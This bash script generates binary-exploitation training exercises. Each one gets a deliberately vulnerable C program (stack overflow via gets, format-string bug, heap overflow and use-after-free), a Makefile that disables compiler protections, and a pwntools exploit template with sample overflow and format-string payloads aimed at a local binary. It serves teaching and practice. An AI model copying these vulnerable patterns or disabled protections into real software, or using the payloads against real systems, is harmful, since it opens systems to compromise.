#!/bin/bash

# Script to create a new exercise

if [ "$#" -lt 1 ]; then
    echo "Usage: $0 exercise_name [template]"
    echo "Templates: basic, buffer_overflow, rop, format_string, heap"
    exit 1
fi

EXERCISE_NAME="$1"
TEMPLATE="${2:-basic}"
ACTIVE_DIR="exercises/active"

# Check if exercise already exists
if [ -d "$ACTIVE_DIR/$EXERCISE_NAME" ]; then
    echo "Error: Exercise $EXERCISE_NAME already exists."
    exit 1
fi

# Create exercise directory
mkdir -p "$ACTIVE_DIR/$EXERCISE_NAME"

# Create README.md
cat > "$ACTIVE_DIR/$EXERCISE_NAME/README.md" << EOL
# $EXERCISE_NAME

## Description
Brief description of the exercise goes here.

## Objective
What the student needs to accomplish.

## Hints
- Hint 1
- Hint 2

## Solution
Brief explanation of the solution approach.

## Created
Date: $(date)
Template: $TEMPLATE
EOL

# Based on template, create additional files
case "$TEMPLATE" in
    basic)
        # Create a simple challenge.c file
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/challenge.c" << EOL
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("Hello, pwn!\n");
    return 0;
}
EOL
        ;;
        
    buffer_overflow)
        # Create a buffer overflow challenge
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/challenge.c" << EOL
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    printf("Congratulations! You've successfully exploited the buffer overflow vulnerability.\n");
    system("/bin/sh");
}

void vulnerable_function() {
    char buffer[64];
    gets(buffer);
    printf("You entered: %s\n", buffer);
}

int main() {
    printf("Enter some text: ");
    vulnerable_function();
    return 0;
}
EOL
        # Create a Makefile
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/Makefile" << EOL
CC = gcc
CFLAGS = -fno-stack-protector -no-pie -z execstack

all: challenge

challenge: challenge.c
	\$(CC) \$(CFLAGS) -o challenge challenge.c

clean:
	rm -f challenge
EOL
        # Create an exploit template
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py" << EOL
#!/usr/bin/env python3
from pwn import *
import ctfmate

# Set up the environment
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# Choose local or remote target
LOCAL = True
if LOCAL:
    p = process('./challenge')
    if args.GDB:
        gdb.attach(p, '''
        break win
        break main
        continue
        ''')
else:
    p = remote('localhost', 1337)

# Exploit
payload = b'A' * 64  # Padding
payload += b'B' * 8   # Saved RBP
payload += p64(0x00000000004011xx)  # Address of win function

# Send the payload
p.sendlineafter(b'Enter some text: ', payload)

# Get the shell
p.interactive()
EOL
        chmod +x "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py"
        ;;
        
    rop)
        # Create a ROP challenge
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/challenge.c" << EOL
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void read_input() {
    char buffer[64];
    read(0, buffer, 200);
}

int main() {
    printf("ROP Challenge - Can you get a shell?\n");
    read_input();
    return 0;
}
EOL
        # Create a Makefile
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/Makefile" << EOL
CC = gcc
CFLAGS = -fno-stack-protector -no-pie

all: challenge

challenge: challenge.c
	\$(CC) \$(CFLAGS) -o challenge challenge.c

clean:
	rm -f challenge
EOL
        # Create an exploit template
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py" << EOL
#!/usr/bin/env python3
from pwn import *
import ctfmate

# Set up the environment
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# Choose local or remote target
LOCAL = True
if LOCAL:
    p = process('./challenge')
    elf = ELF('./challenge')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust path as needed
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')
else:
    p = remote('localhost', 1337)
    elf = ELF('./challenge')
    libc = ELF('./libc.so.6')  # Provided libc

# ROP chain
rop = ROP(elf)
# Add your ROP gadgets here

# Exploit
payload = b'A' * 72  # Padding
payload += rop.chain()

# Send the payload
p.recvuntil(b'Can you get a shell?\n')
p.send(payload)

# Get the shell
p.interactive()
EOL
        chmod +x "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py"
        ;;
        
    format_string)
        # Create a format string challenge
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/challenge.c" << EOL
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int secret = 0;

void win() {
    if (secret == 0x1337) {
        printf("Congratulations! You've successfully exploited the format string vulnerability.\n");
        system("/bin/sh");
    } else {
        printf("Nice try, but secret is %d, not 0x1337.\n", secret);
    }
}

int main() {
    char buffer[100];
    
    printf("Enter format string: ");
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);  // Format string vulnerability!
    
    printf("Secret value: %d\n", secret);
    printf("Can you change it to 0x1337?\n");
    
    printf("Try again: ");
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);  // Format string vulnerability!
    
    win();
    return 0;
}
EOL
        # Create a Makefile
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/Makefile" << EOL
CC = gcc
CFLAGS = -fno-stack-protector -no-pie

all: challenge

challenge: challenge.c
	\$(CC) \$(CFLAGS) -o challenge challenge.c

clean:
	rm -f challenge
EOL
        # Create an exploit template
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py" << EOL
#!/usr/bin/env python3
from pwn import *
import ctfmate

# Set up the environment
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# Choose local or remote target
LOCAL = True
if LOCAL:
    p = process('./challenge')
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')
else:
    p = remote('localhost', 1337)

# Get address of secret variable
# You can use: objdump -t challenge | grep secret

# Exploit format string vulnerability
p.recvuntil(b'Enter format string: ')
payload1 = b'%p %p %p %p'  # Example to leak addresses
p.sendline(payload1)

# Parse the output
p.recvuntil(b'Try again: ')

# Send format string to change secret value to 0x1337 (4919)
payload2 = f'%4919c%10$n'.encode()  # Adjust the offset as needed
p.sendline(payload2)

# Get the shell
p.interactive()
EOL
        chmod +x "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py"
        ;;
        
    heap)
        # Create a heap exploitation challenge
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/challenge.c" << EOL
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct chunk {
    char data[32];
};

struct chunk *chunks[10];
int chunk_count = 0;

void win() {
    printf("Congratulations! You've successfully exploited the heap vulnerability.\n");
    system("/bin/sh");
}

void add_chunk() {
    if (chunk_count >= 10) {
        printf("Maximum number of chunks reached.\n");
        return;
    }
    
    chunks[chunk_count] = malloc(sizeof(struct chunk));
    if (!chunks[chunk_count]) {
        printf("Malloc failed.\n");
        return;
    }
    
    printf("Chunk %d created. Enter data: ", chunk_count);
    read(0, chunks[chunk_count]->data, 40); // Overflow!
    
    chunk_count++;
}

void delete_chunk() {
    int index;
    printf("Enter chunk index to delete: ");
    scanf("%d", &index);
    
    if (index < 0 || index >= chunk_count || !chunks[index]) {
        printf("Invalid index.\n");
        return;
    }
    
    free(chunks[index]);
    // Use-after-free vulnerability! We don't set chunks[index] to NULL
}

void view_chunk() {
    int index;
    printf("Enter chunk index to view: ");
    scanf("%d", &index);
    
    if (index < 0 || index >= chunk_count || !chunks[index]) {
        printf("Invalid index.\n");
        return;
    }
    
    printf("Chunk %d data: %s\n", index, chunks[index]->data);
}

void menu() {
    printf("\n--- Heap Challenge Menu ---\n");
    printf("1. Add chunk\n");
    printf("2. Delete chunk\n");
    printf("3. View chunk\n");
    printf("4. Exit\n");
    printf("Choice: ");
}

int main() {
    int choice;
    
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    
    printf("Heap Exploitation Challenge\n");
    
    while (1) {
        menu();
        scanf("%d", &choice);
        getchar(); // Consume newline
        
        switch (choice) {
            case 1:
                add_chunk();
                break;
            case 2:
                delete_chunk();
                break;
            case 3:
                view_chunk();
                break;
            case 4:
                printf("Goodbye!\n");
                return 0;
            default:
                printf("Invalid choice.\n");
        }
    }
    
    return 0;
}
EOL
        # Create a Makefile
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/Makefile" << EOL
CC = gcc
CFLAGS = -no-pie

all: challenge

challenge: challenge.c
	\$(CC) \$(CFLAGS) -o challenge challenge.c

clean:
	rm -f challenge
EOL
        # Create an exploit template
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py" << EOL
#!/usr/bin/env python3
from pwn import *
import ctfmate

# Set up the environment
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# Choose local or remote target
LOCAL = True
if LOCAL:
    p = process('./challenge')
    elf = ELF('./challenge')
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')
else:
    p = remote('localhost', 1337)
    elf = ELF('./challenge')

win_addr = elf.symbols['win']
log.info(f"Win function at: {hex(win_addr)}")

def add_chunk(data):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendafter(b'Enter data: ', data)
    
def delete_chunk(index):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Enter chunk index to delete: ', str(index).encode())
    
def view_chunk(index):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Enter chunk index to view: ', str(index).encode())
    p.recvuntil(b'Chunk ' + str(index).encode() + b' data: ')
    return p.recvline().strip()

# Exploit strategy:
# 1. Create chunks
# 2. Trigger double-free or use-after-free
# 3. Overwrite function pointer
# 4. Trigger win function

# Start your exploit here
# ...

p.interactive()
EOL
        chmod +x "$ACTIVE_DIR/$EXERCISE_NAME/exploit.py"
        ;;
        
    *)
        echo "Unknown template: $TEMPLATE"
        echo "Using basic template instead."
        # Create a simple challenge.c file
        cat > "$ACTIVE_DIR/$EXERCISE_NAME/challenge.c" << EOL
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("Hello, pwn!\n");
    return 0;
}
EOL
        ;;
esac

echo "Created new exercise: $EXERCISE_NAME with template: $TEMPLATE"
echo "Files are located in: $ACTIVE_DIR/$EXERCISE_NAME/"
